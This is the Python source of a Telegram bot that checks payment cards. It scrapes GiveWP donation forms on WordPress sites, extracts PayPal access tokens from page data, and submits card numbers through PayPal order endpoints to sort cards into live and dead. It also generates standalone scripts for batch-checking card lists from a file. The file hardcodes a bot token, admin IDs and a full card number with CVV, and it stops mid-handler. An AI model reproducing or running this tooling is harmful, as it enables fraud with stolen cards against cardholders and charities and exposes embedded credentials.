#!/usr/bin/env python3
# =====================================================
#  Card Checker Bot — Universal PayPal Commerce
#  - Auto refresh of nonce/token/price levels before every charge
#  - Uses {1.00, 5.00} first
#  - Extracts merchantId from data-client-token
#  - Generates universal gateway files that refresh on every charge
# =====================================================
import telebot
import time
import threading
from telebot import types
import requests, random, json, re, base64
from datetime import datetime
import os
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
import uuid
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

try:
    from fake_useragent import UserAgent
    _UU = UserAgent()
    def rand_ua(): return _UU.random
except:
    _UAS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
    ]
    def rand_ua(): return random.choice(_UAS)


token = '8689698569:AAEKe4aG2sNS0yDiGg0OVFD2TfCHSLwLlDc'
bot = telebot.TeleBot(token, parse_mode="HTML")
admin = 6843321125
myid = ['6843321125']
admins = ['6843321125']
OWNER_ID = 6843321125

waiting_users = {}
reply_mode = {}
processing_status = {}

if not os.path.exists('blockusers.txt'):
    with open('blockusers.txt', 'w') as f:
        f.write('')
if not os.path.exists('users.txt'):
    with open('users.txt', 'w') as f:
        f.write('')


# ============================================================
#  Helpers
# ============================================================
def save_user(user_id):
    try:
        with open('users.txt', 'r') as file:
            users = file.read().splitlines()
        if str(user_id) not in users:
            with open('users.txt', 'a') as file:
                file.write(f"{user_id}\n")
    except:
        with open('users.txt', 'w') as file:
            file.write(f"{user_id}\n")


def is_blocked(user_id):
    try:
        with open("blockusers.txt", "r") as file:
            blocked = [line.strip() for line in file.read().splitlines() if line.strip()]
        return str(user_id) in blocked
    except:
        return False


def safe_edit_message(chat_id, message_id, text, parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            return bot.edit_message_text(chat_id=chat_id, message_id=message_id, text=text, parse_mode=parse_mode)
        except Exception as e:
            err = str(e)
            if "message is not modified" in err:
                return None
            if "429" in err:
                try:
                    wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None


def safe_send_document(chat_id, file_path, caption="", parse_mode="HTML", retries=3):
    for i in range(retries):
        try:
            with open(file_path, 'rb') as f:
                return bot.send_document(chat_id, f, caption=caption, parse_mode=parse_mode)
        except Exception as e:
            err = str(e)
            if "429" in err:
                try:
                    wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None


def safe_send_message(chat_id, text, parse_mode="HTML", retries=3, reply_markup=None):
    for i in range(retries):
        try:
            return bot.send_message(chat_id, text, parse_mode=parse_mode, reply_markup=reply_markup)
        except Exception as e:
            err = str(e)
            if "429" in err:
                try:
                    wait_time = int(err.split("retry after ")[1].split(")")[0]) if "retry after" in err else 30
                except:
                    wait_time = 30
                time.sleep(min(wait_time, 60))
            else:
                break
    return None


# ============================================================
#  Response classification
# ============================================================
LIVE_RESPONSES = [
    'CHARGE', 'INSUFFICIENT_FUNDS', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
    'INVALID_OR_RESTRICTED_CARD', 'TRANSACTION_NOT_PERMITTED', 'DO_NOT_HONOR',
    'CVV2_FAILURE', 'CVV_FAILURE', 'EXPIRED_CARD', 'SUSPECTED_FRAUD',
    'RESTRICTED_OR_INACTIVE_ACCOUNT', 'GENERIC_DECLINE', 'INVALID_ACCOUNT',
    'AUTHENTICATION_FAILURE', 'PAYMENT_DENIED', 'TRANSACTION_REFUSED',
    'ACCOUNT_CLOSED', 'LOST_OR_STOLEN', 'COMPLIANCE_VIOLATION',
    'PAYEE_BLOCKED_TRANSACTION', 'PAYER_ACCOUNT_RESTRICTED',
    'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED', 'CRYPTOGRAPHIC_FAILURE',
    'DECLINED',
]

DEAD_RESPONSES = [
    'invalid_client', 'Client Authentication failed', 'invalid_grant',
    'unsupported_grant_type', 'invalid_scope', 'Create Order Failed',
    'Invalid card format', 'No form fields', 'No au', 'No PayPal data',
    'Connection failed', 'Decode error', 'Invalid URL', 'Error:',
    'No GiveWP form', 'No access_token', 'Token invalid', 'Extraction failed',
]

def is_live_response(resp):
    return any(k in resp for k in LIVE_RESPONSES)


# ============================================================
#  Universal PayPal Commerce Tester
# ============================================================
class PayPalUniversal:
    def __init__(self, url, verbose=True):
        self.page_url = url
        parsed = urlparse(url)
        self.host = parsed.netloc
        self.path = parsed.path
        if parsed.query:
            self.path += "?" + parsed.query

        self.first_name = ["James", "John", "Robert", "Michael", "William", "David"]
        self.last_name = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia"]

        self.r = requests.Session()
        self.r.verify = False
        self.uu = type("U", (), {"random": staticmethod(rand_ua)})()
        self.verbose = verbose
        self.email = f"{random.choice(self.first_name)}{random.randint(100,999)}@gmail.com"

        self.reset_extracted()

    def reset_extracted(self):
        self.id_form1 = None
        self.id_form2 = None
        self.nonec = None
        self.au = None
        self.paypal_metadata = None
        self.client_id = None
        self.minimum = "5.00"
        self.maximum = "999999.99"
        self.price_levels = []
        self.currency = "USD"
        self.form_title = ""
        self.page_html = ""
        self.can_check = True
        self.reason = ""

    def _log(self, msg):
        if self.verbose:
            print(msg)

    def _extract_all(self):
        self.reset_extracted()
        self._log(f"\n{'='*60}")
        self._log(f"[*] Fetching: {self.page_url}")
        self._log(f"{'='*60}")

        try:
            headers = {
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }
            r = self.r.get(self.page_url, headers=headers, timeout=25)
            self.page_html = r.text
            self._log(f"[+] Page: {len(self.page_html)} bytes (status {r.status_code})")
        except Exception as e:
            self.reason = f"Fetch failed: {e}"
            return False

        if 'give-form-id-prefix' not in self.page_html or 'give-form-hash' not in self.page_html:
            for pattern in [
                r'<iframe[^>]*src="(https?://[^"]*give/\d+[^"]*)"',
                r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
                r'<iframe[^>]*src="([^"]*donation[^"]*)"',
            ]:
                m = re.search(pattern, self.page_html, re.IGNORECASE)
                if m:
                    iframe_url = m.group(1)
                    if iframe_url.startswith('//'):
                        iframe_url = 'https:' + iframe_url
                    self._log(f"[+] iframe: {iframe_url}")
                    try:
                        r2 = self.r.get(iframe_url, headers={'user-agent': self.uu.random}, timeout=25)
                        self.page_html = r2.text
                        break
                    except: pass

        if 'give-form-id-prefix' not in self.page_html:
            self.reason = "No GiveWP form"
            return False

        try:
            self.id_form1 = re.search(r'name="give-form-id-prefix"\s+value="(.*?)"', self.page_html).group(1)
            self.id_form2 = re.search(r'name="give-form-id"\s+value="(.*?)"', self.page_html).group(1)
            self.nonec = re.search(r'name="give-form-hash"\s+value="(.*?)"', self.page_html).group(1)
        except Exception as e:
            self.reason = f"Form extract failed: {e}"
            return False

        m = re.search(r'name="give-form-minimum"\s+value="([^"]*)"', self.page_html)
        if m and m.group(1).strip():
            self.minimum = m.group(1).strip()
        m = re.search(r'name="give-form-maximum"\s+value="([^"]*)"', self.page_html)
        if m and m.group(1).strip():
            self.maximum = m.group(1).strip()
        m = re.search(r'name="give-currency"\s+value="([^"]*)"', self.page_html)
        if m and m.group(1).strip():
            self.currency = m.group(1).strip()
        else:
            m = re.search(r'"currency":"([A-Z]{3})"', self.page_html)
            if m: self.currency = m.group(1)

        m = re.search(r'name="give-form-title"\s+value="([^"]*)"', self.page_html)
        if m: self.form_title = m.group(1).strip()

        # data-client-token
        try:
            enc = re.search(r'"data-client-token":"(.*?)"', self.page_html).group(1)
            padded = enc + '=' * (-len(enc) % 4)
            dec = base64.b64decode(padded).decode('utf-8', errors='ignore')

            m = re.search(r'"accessToken":"([^"]+)"', dec)
            if m: self.au = m.group(1)

            m = re.search(r'merchant_id=([\w]+)', dec)
            if m:
                self.paypal_metadata = m.group(1)
            else:
                m = re.search(r'"merchantId":"([^"]+)"', dec)
                if m: self.paypal_metadata = m.group(1)
                else:
                    m = re.search(r'"merchantAccountId":"([^"]+)"', dec)
                    if m: self.paypal_metadata = m.group(1)

            m = re.search(r'"clientId":"([^"]+)"', dec)
            if m: self.client_id = m.group(1)
        except:
            for p in [r'"accessToken":"([^"]+)"',
                      r'accessToken["\']?\s*[:=]\s*["\']([^"\']{20,})["\']']:
                m = re.search(p, self.page_html)
                if m:
                    self.au = m.group(1)
                    break

        # price levels
        self.price_levels = []
        for pat, mode in [
            (r'data-price-id=["\']([^"\']+)["\'][^>]*?data-price=["\']([\d.]+)["\']', 1),
            (r'data-price=["\']([\d.]+)["\'][^>]*?data-price-id=["\']([^"\']+)["\']', 2),
        ]:
            for m in re.finditer(pat, self.page_html):
                try:
                    if mode == 1:
                        pid, amt = m.group(1), float(m.group(2))
                    else:
                        amt, pid = float(m.group(1)), m.group(2)
                    self.price_levels.append((pid, amt))
                except: pass

        seen = set()
        unique = []
        for pid, amt in self.price_levels:
            if (pid, amt) not in seen and amt > 0:
                seen.add((pid, amt))
                unique.append((pid, amt))
        self.price_levels = sorted(unique, key=lambda x: x[1])

        self._log(f"[+] form1={self.id_form1}, form2={self.id_form2}, nonce={self.nonec}")
        self._log(f"[+] min={self.minimum}, max={self.maximum}, currency={self.currency}")
        self._log(f"[+] metadata={self.paypal_metadata}, au={str(self.au)[:40]}...")

        if not self.au:
            self.reason = "No access_token"
            self.can_check = False
            return False

        return True

    def _test_token(self):
        if not self.au:
            return False
        try:
            r = self.r.get(
                'https://api-m.paypal.com/v1/identity/oauth2/userinfo?schema=paypalv1.1',
                headers={'authorization': f'Bearer {self.au}'},
                timeout=10
            )
            if r.status_code == 200:
                return True
            elif r.status_code == 401:
                self.reason = "Token expired"
                return False
            return True
        except:
            return True

    def _create_order(self, price_id, amount):
        data = MultipartEncoder({
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, amount),
            'give-price-id': (None, price_id),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        })
        headers = {
            'content-type': data.content_type,
            'user-agent': self.uu.random,
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.host}',
            'referer': self.page_url,
        }
        try:
            r = self.r.post(
                f'https://{self.host}/wp-admin/admin-ajax.php',
                params={'action': 'give_paypal_commerce_create_order'},
                headers=headers, data=data, timeout=20
            )
            self._log(f"  [create pid={price_id} amt={amount}] {r.status_code} len={len(r.text)}")
            if r.status_code == 200 and r.text and not r.text.strip().startswith('<'):
                try:
                    j = r.json()
                    if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                        return j['data']['id']
                except: pass
            return None
        except Exception as e:
            self._log(f"  [create] error: {e}")
            return None

    def _confirm_payment(self, order_id, card):
        n, mm, yy, cvc = card.split("|")
        if "20" in yy:
            yy = yy.split("20")[1]
        expiry = f"20{yy}-{mm}"
        metadata = self.paypal_metadata or self.client_id or ''

        headers = {
            'authorization': f'Bearer {self.au}',
            'paypal-client-metadata-id': metadata,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.uu.random,
        }
        data = {
            'payment_source': {
                'card': {
                    'number': n,
                    'expiry': expiry,
                    'security_code': cvc,
                    'attributes': {'verification': {'method': 'SCA_WHEN_REQUIRED'}},
                },
            },
            'application_context': {'vault': False},
        }
        try:
            r = self.r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
                headers=headers, json=data, timeout=15
            )
            self._log(f"  [confirm] {r.status_code}")
            return r
        except Exception as e:
            self._log(f"  [confirm] error: {e}")
            return None

    def _approve_order(self, order_id, amount):
        data = MultipartEncoder({
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, amount),
            'give-price-id': (None, 'custom'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        })
        headers = {
            'content-type': data.content_type,
            'user-agent': self.uu.random,
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{self.host}',
            'referer': self.page_url,
        }
        try:
            r = self.r.post(
                f'https://{self.host}/wp-admin/admin-ajax.php',
                params={'action': 'give_paypal_commerce_approve_order', 'order': order_id},
                headers=headers, data=data, timeout=20
            )
            self._log(f"  [approve] {r.status_code}")
            return r
        except Exception as e:
            self._log(f"  [approve] error: {e}")
            return None

    def _build_attempts(self):
        attempts = [
            ('custom', '1.00'),
            ('custom', '5.00'),
        ]
        for pid, amt in self.price_levels:
            if amt in (1.0, 5.0):
                continue
            attempts.append((str(pid), f"{amt:.2f}"))
        seen = set()
        filtered = []
        for pid, amt in attempts:
            key = (str(pid), amt)
            if key not in seen:
                seen.add(key)
                filtered.append((pid, amt))
        return filtered

    def charge(self, card):
        # ✅ update all data from page before every charge
        if not self._extract_all():
            return f"Extraction failed: {self.reason}"

        if not self._test_token():
            return f"Token invalid: {self.reason}"

        order_id = None
        used_amt = None
        for pid, amt in self._build_attempts():
            self._log(f"\n[>] Try pid={pid}, amt={amt}")
            oid = self._create_order(pid, amt)
            if oid:
                order_id = oid
                used_amt = amt
                self._log(f"[+] ✅ ORDER {oid} (amt={amt})")
                break

        if not order_id:
            return "Create Order Failed"

        self._confirm_payment(order_id, card)
        r = self._approve_order(order_id, used_amt)
        if not r:
            return "Approve failed"

        text = r.text
        if 'true' in text.lower() and 'error' not in text.lower():
            return f'CHARGE {used_amt}$'

        codes = [
            'INVALID_OR_RESTRICTED_CARD', 'TRANSACTION_NOT_PERMITTED',
            'INSUFFICIENT_FUNDS', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
            'RESTRICTED_OR_INACTIVE_ACCOUNT', 'PAYEE_BLOCKED_TRANSACTION',
            'GENERIC_DECLINE', 'DO_NOT_HONOR', 'CVV2_FAILURE', 'CVV_FAILURE',
            'EXPIRED_CARD', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN',
            'TRANSACTION_REFUSED', 'INVALID_ACCOUNT', 'AUTHENTICATION_FAILURE',
            'PAYMENT_DENIED', 'COMPLIANCE_VIOLATION', 'PAYEE_ACCOUNT_RESTRICTED',
            'PAYER_ACCOUNT_RESTRICTED', 'CAPTURE_DECLINED', 'AUTHORIZATION_DENIED',
            'CRYPTOGRAPHIC_FAILURE', 'TX_ATTEMPTS_EXCEED_LIMIT',
        ]
        for c in codes:
            if c in text:
                return c
        if 'declined' in text.lower():
            return "DECLINED"
        try:
            return str(r.json()['data']['error'])
        except:
            return "UNKNOWN_ERROR"


# ============================================================
#  Bridge: check_single_link
# ============================================================
TEST_CARD = '4059986126444431|11|30|947'


def check_single_link(link):
    try:
        if not link.startswith(("http://", "https://")):
            return {'link': link, 'live': False, 'respons': 'Invalid URL'}
        tester = PayPalUniversal(link, verbose=False)
        result = tester.charge(TEST_CARD)
        live = is_live_response(result)
        return {
            'link': link, 'live': live, 'respons': result,
            'amount': tester.minimum,
            'id_form1': tester.id_form1 or '',
            'id_form2': tester.id_form2 or '',
            'nonec': tester.nonec or '',
            'au': tester.au or '',
            'paypal_metadata': tester.paypal_metadata or '',
            'access_token': tester.au or '',
            'minimum': tester.minimum,
            'currency': tester.currency,
            'price_levels': tester.price_levels,
            'js_checked': 0,
        }
    except Exception as e:
        return {'link': link, 'live': False, 'respons': str(e)[:100], 'amount': None}


# ============================================================
#  Gateway file generator (self-refreshing)
# ============================================================
def generate_gateway_code(result, link, result_dict=None):
    parsed = urlparse(link)
    host = parsed.netloc
    path = parsed.path
    if parsed.query:
        path += "?" + parsed.query

    # preferred initial amount (in case we could read it): 1.00 → 5.00
    return f'''#!/usr/bin/env python3
# =====================================================
#  Universal Live Gateway — Auto Refresh Edition
#  Link     : {link}
#  Response : {result}
# =====================================================

import requests, re, random, time, base64, uuid, os, json
from fake_useragent import UserAgent
from requests_toolbelt.multipart.encoder import MultipartEncoder
from urllib.parse import urlparse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

GATEWAY_URL = "{link}"
HOST        = "{host}"
PATH        = "{path}"
AJAX_URL    = "https://{host}/wp-admin/admin-ajax.php"
PREFERRED_AMOUNTS = ["1.00", "5.00"]


class PayPal:
    def __init__(self):
        self.first_name = ["James", "John", "Robert", "Michael", "William"]
        self.last_name  = ["Smith", "Johnson", "Williams", "Brown", "Jones"]
        self.email = f"{{random.choice(self.first_name)}}{{random.randint(100,999)}}@gmail.com"
        self.r = requests.Session()
        self.r.verify = False
        self.uu = UserAgent()
        self._reset()

    def _reset(self):
        self.id_form1 = None
        self.id_form2 = None
        self.nonec = None
        self.au = None
        self.paypal_metadata = None
        self.client_id = None
        self.minimum = "5.00"
        self.maximum = "999999.99"
        self.price_levels = []
        self.currency = "USD"
        self.page_html = ""
        self.reason = ""

    # ============ AUTO EXTRACT ============
    def _extract_all(self):
        self._reset()
        try:
            headers = {{
                'user-agent': self.uu.random,
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                'accept-language': 'en-US,en;q=0.9',
            }}
            r = self.r.get(GATEWAY_URL, headers=headers, timeout=25)
            self.page_html = r.text
        except Exception as e:
            self.reason = f"Fetch failed: {{e}}"
            return False

        if 'give-form-id-prefix' not in self.page_html or 'give-form-hash' not in self.page_html:
            for pattern in [
                r'<iframe[^>]*src="(https?://[^"]*give/\\d+[^"]*)"',
                r'<iframe[^>]*src="([^"]*givewp[^"]*)"',
                r'<iframe[^>]*src="([^"]*donation[^"]*)"',
            ]:
                m = re.search(pattern, self.page_html, re.IGNORECASE)
                if m:
                    ifu = m.group(1)
                    if ifu.startswith('//'): ifu = 'https:' + ifu
                    try:
                        r2 = self.r.get(ifu, headers={{'user-agent': self.uu.random}}, timeout=25)
                        self.page_html = r2.text
                        break
                    except: pass

        if 'give-form-id-prefix' not in self.page_html:
            self.reason = "No GiveWP form"
            return False

        try:
            self.id_form1 = re.search(r'name="give-form-id-prefix"\\s+value="(.*?)"', self.page_html).group(1)
            self.id_form2 = re.search(r'name="give-form-id"\\s+value="(.*?)"', self.page_html).group(1)
            self.nonec = re.search(r'name="give-form-hash"\\s+value="(.*?)"', self.page_html).group(1)
        except Exception as e:
            self.reason = f"Form extract failed: {{e}}"
            return False

        m = re.search(r'name="give-form-minimum"\\s+value="([^"]*)"', self.page_html)
        if m and m.group(1).strip():
            self.minimum = m.group(1).strip()
        m = re.search(r'name="give-form-maximum"\\s+value="([^"]*)"', self.page_html)
        if m and m.group(1).strip():
            self.maximum = m.group(1).strip()
        m = re.search(r'name="give-currency"\\s+value="([^"]*)"', self.page_html)
        if m and m.group(1).strip():
            self.currency = m.group(1).strip()

        try:
            enc = re.search(r'"data-client-token":"(.*?)"', self.page_html).group(1)
            padded = enc + '=' * (-len(enc) % 4)
            dec = base64.b64decode(padded).decode('utf-8', errors='ignore')
            m = re.search(r'"accessToken":"([^"]+)"', dec)
            if m: self.au = m.group(1)
            m = re.search(r'merchant_id=([\\w]+)', dec)
            if m:
                self.paypal_metadata = m.group(1)
            else:
                m = re.search(r'"merchantId":"([^"]+)"', dec)
                if m: self.paypal_metadata = m.group(1)
            m = re.search(r'"clientId":"([^"]+)"', dec)
            if m: self.client_id = m.group(1)
        except:
            for p in [r'"accessToken":"([^"]+)"',
                      r'accessToken["\\']?\\s*[:=]\\s*["\\']([^"\\']{{20,}})["\\']']:
                m = re.search(p, self.page_html)
                if m:
                    self.au = m.group(1)
                    break

        self.price_levels = []
        for pat, mode in [
            (r'data-price-id=["\\']([^"\\']+)["\\'][^>]*?data-price=["\\']([\\d.]+)["\\']', 1),
            (r'data-price=["\\']([\\d.]+)["\\'][^>]*?data-price-id=["\\']([^"\\']+)["\\']', 2),
        ]:
            for m in re.finditer(pat, self.page_html):
                try:
                    if mode == 1:
                        pid, amt = m.group(1), float(m.group(2))
                    else:
                        amt, pid = float(m.group(1)), m.group(2)
                    self.price_levels.append((pid, amt))
                except: pass

        seen = set()
        unique = []
        for pid, amt in self.price_levels:
            if (pid, amt) not in seen and amt > 0:
                seen.add((pid, amt))
                unique.append((pid, amt))
        self.price_levels = sorted(unique, key=lambda x: x[1])

        if not self.au:
            self.reason = "No access_token"
            return False
        return True

    def _test_token(self):
        if not self.au:
            return False
        try:
            r = self.r.get(
                'https://api-m.paypal.com/v1/identity/oauth2/userinfo?schema=paypalv1.1',
                headers={{'authorization': f'Bearer {{self.au}}'}},
                timeout=10
            )
            if r.status_code == 200:
                return True
            if r.status_code == 401:
                self.reason = "Token expired"
                return False
            return True
        except:
            return True

    def _create_order(self, price_id, amount):
        data = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, amount),
            'give-price-id': (None, price_id),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        headers = {{
            'content-type': data.content_type,
            'user-agent': self.uu.random,
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{HOST}}',
            'referer': GATEWAY_URL,
        }}
        try:
            r = self.r.post(
                AJAX_URL,
                params={{'action': 'give_paypal_commerce_create_order'}},
                headers=headers, data=data, timeout=20
            )
            if r.status_code == 200 and r.text and not r.text.strip().startswith('<'):
                try:
                    j = r.json()
                    if j.get('success') and isinstance(j.get('data'), dict) and j['data'].get('id'):
                        return j['data']['id']
                except: pass
        except: pass
        return None

    def _confirm(self, order_id, card):
        n, mm, yy, cvc = card.split("|")
        if "20" in yy: yy = yy.split("20")[1]
        expiry = f"20{{yy}}-{{mm}}"
        metadata = self.paypal_metadata or self.client_id or ''
        headers = {{
            'authorization': f'Bearer {{self.au}}',
            'paypal-client-metadata-id': metadata,
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'referer': 'https://assets.braintreegateway.com/',
            'user-agent': self.uu.random,
        }}
        data = {{
            'payment_source': {{
                'card': {{
                    'number': n,
                    'expiry': expiry,
                    'security_code': cvc,
                    'attributes': {{'verification': {{'method': 'SCA_WHEN_REQUIRED'}}}},
                }},
            }},
            'application_context': {{'vault': False}},
        }}
        try:
            return self.r.post(
                f'https://cors.api.paypal.com/v2/checkout/orders/{{order_id}}/confirm-payment-source',
                headers=headers, json=data, timeout=15
            )
        except:
            return None

    def _approve(self, order_id, amount):
        data = MultipartEncoder({{
            'give-form-id-prefix': (None, self.id_form1),
            'give-form-id': (None, self.id_form2),
            'give-form-hash': (None, self.nonec),
            'give-amount': (None, amount),
            'give-price-id': (None, 'custom'),
            'payment-mode': (None, 'paypal-commerce'),
            'give_first': (None, random.choice(self.first_name)),
            'give_last': (None, random.choice(self.last_name)),
            'give_email': (None, self.email),
            'give-gateway': (None, 'paypal-commerce'),
        }})
        headers = {{
            'content-type': data.content_type,
            'user-agent': self.uu.random,
            'x-requested-with': 'XMLHttpRequest',
            'origin': f'https://{{HOST}}',
            'referer': GATEWAY_URL,
        }}
        try:
            return self.r.post(
                AJAX_URL,
                params={{'action': 'give_paypal_commerce_approve_order', 'order': order_id}},
                headers=headers, data=data, timeout=20
            )
        except:
            return None

    def _build_attempts(self):
        attempts = [('custom', a) for a in PREFERRED_AMOUNTS]
        for pid, amt in self.price_levels:
            if amt in (1.0, 5.0):
                continue
            attempts.append((str(pid), f"{{amt:.2f}}"))
        seen = set()
        out = []
        for pid, amt in attempts:
            key = (str(pid), amt)
            if key not in seen:
                seen.add(key)
                out.append((pid, amt))
        return out

    def Charge(self, ccx):
        # ✅ تحديث كامل قبل كل شحنة
        if not self._extract_all():
            return f"Extraction failed: {{self.reason}}"
        if not self._test_token():
            return f"Token invalid: {{self.reason}}"

        order_id = None
        used_amt = None
        for pid, amt in self._build_attempts():
            oid = self._create_order(pid, amt)
            if oid:
                order_id = oid
                used_amt = amt
                break
        if not order_id:
            return "Create Order Failed"

        self._confirm(order_id, ccx)
        r = self._approve(order_id, used_amt)
        if not r:
            return "Approve failed"

        text = r.text
        if 'true' in text.lower() and 'error' not in text.lower():
            return f'CHARGE {{used_amt}}$'
        codes = [
            'INVALID_OR_RESTRICTED_CARD', 'TRANSACTION_NOT_PERMITTED',
            'INSUFFICIENT_FUNDS', 'PAYER_CANNOT_PAY', 'ORDER_NOT_APPROVED',
            'RESTRICTED_OR_INACTIVE_ACCOUNT', 'PAYEE_BLOCKED_TRANSACTION',
            'GENERIC_DECLINE', 'DO_NOT_HONOR', 'CVV2_FAILURE', 'CVV_FAILURE',
            'EXPIRED_CARD', 'SUSPECTED_FRAUD', 'ACCOUNT_CLOSED', 'LOST_OR_STOLEN',
            'TRANSACTION_REFUSED', 'INVALID_ACCOUNT', 'AUTHENTICATION_FAILURE',
            'PAYMENT_DENIED', 'COMPLIANCE_VIOLATION', 'CAPTURE_DECLINED',
            'AUTHORIZATION_DENIED', 'CRYPTOGRAPHIC_FAILURE',
        ]
        for c in codes:
            if c in text: return c
        if 'declined' in text.lower():
            return "DECLINED"
        try:
            return str(r.json()['data']['error'])
        except:
            return "UNKNOWN_ERROR"


# ============ CLI ============
def single_check():
    print("\\n--- Single Card ---")
    card = input("Card (num|mm|yy|cvv): ").strip()
    if not card:
        return
    p = PayPal()
    print("Response:", p.Charge(card))


def file_check():
    print("\\n--- File Check ---")
    path = input("File path: ").strip()
    if not os.path.exists(path):
        print("Not found")
        return
    with open(path, 'r', encoding='utf-8', errors='ignore') as f:
        cards = [l.strip() for l in f if l.strip()]
    if not cards:
        return
    out = f"results_{{int(time.time())}}.txt"
    with open(out, 'w', encoding='utf-8') as fo:
        for i, c in enumerate(cards, 1):
            p = PayPal()
            res = p.Charge(c)
            line = f"{{c}} => {{res}}"
            print(f"[{{i}}/{{len(cards)}}] {{line}}")
            fo.write(line + "\\n"); fo.flush()
            time.sleep(1)
    print("Saved:", out)


def main():
    print("=" * 50)
    print("  Live Gateway Checker")
    print(f"  Link    : {{GATEWAY_URL}}")
    print("=" * 50)
    while True:
        print("\\n[1] Single card  [2] File  [3] Info  [0] Exit")
        c = input("Choose: ").strip()
        if c == '1':
            single_check()
        elif c == '2':
            file_check()
        elif c == '3':
            print(f"\\nGATEWAY_URL : {{GATEWAY_URL}}")
            print(f"HOST        : {{HOST}}")
            print(f"AJAX_URL    : {{AJAX_URL}}")
            print(f"PREFERRED   : {{PREFERRED_AMOUNTS}}")
        elif c == '0':
            break


if __name__ == '__main__':
    main()
'''


# ============================================================
#  BOT HANDLERS
# ============================================================
@bot.message_handler(func=lambda m: m.text and m.text.lower().startswith('/paypal'))
def ali_al2(massege):
    save_user(massege.from_user.id)
    if is_blocked(massege.from_user.id):
        safe_send_message(massege.chat.id, 'The admin has blocked you.')
        return
    ko = safe_send_message(massege.chat.id, "- The gate is being withdrawn ...")
    if not ko: return
    time.sleep(1)
    try:
        parts = massege.text.split(maxsplit=1)
        if len(parts) != 2:
            safe_edit_message(massege.chat.id, ko.message_id,
                '- Please send the link like this:\n\n<code>/paypal https://xxxxxxx.xxx/xxxx</code>')
            return
        link = parts[1].strip()
        if not link.startswith(("http://", "https://")):
            safe_edit_message(massege.chat.id, ko.message_id, "Invalid link format ❌")
            return
        try:
            r = requests.get(link, headers={"User-Agent": rand_ua()}, timeout=15, verify=False)
            if r.status_code != 200:
                safe_edit_message(massege.chat.id, ko.message_id, f"Site returned status: {r.status_code} ❌")
                return
        except:
            pass
        time.sleep(1)
        safe_edit_message(massege.chat.id, ko.message_id, "Gate found ✅")
    except: pass

    try:
        tester = PayPalUniversal(link, verbose=False)
        result = tester.charge(TEST_CARD)
        live = is_live_response(result)

        if not live:
            safe_edit_message(massege.chat.id, ko.message_id,
                f"❌ <b>Dead:</b> <code>{link}</code>\n📝 <b>Response:</b> {result}")
            return

        file_name = f'gateway_{int(time.time())}.py'
        with open(file_name, "w", encoding="utf-8") as f:
            f.write(generate_gateway_code(result, link))
        safe_send_document(massege.chat.id, file_name, caption=f'''✅ <b>Live Gateway Found!</b>
━━━━━━━━━━━━━━━━━━━━
🔗 Link: <code>{link}</code>
━━━━━━━━━━━━━━━━━━━━
💬 <b>Response:</b> <code>{result}</code>
💰 <b>Min:</b> <code>${tester.minimum}</code>
🌐 <b>Currency:</b> <code>{tester.currency}</code>
🎯 <b>Levels:</b> <code>{len(tester.price_levels)}</code>
━━━━━━━━━━━━━━━━━━━━
Dev: @FAWZY30''')
        try: os.remove(file_name)
        except: pass
    except Exception as e:
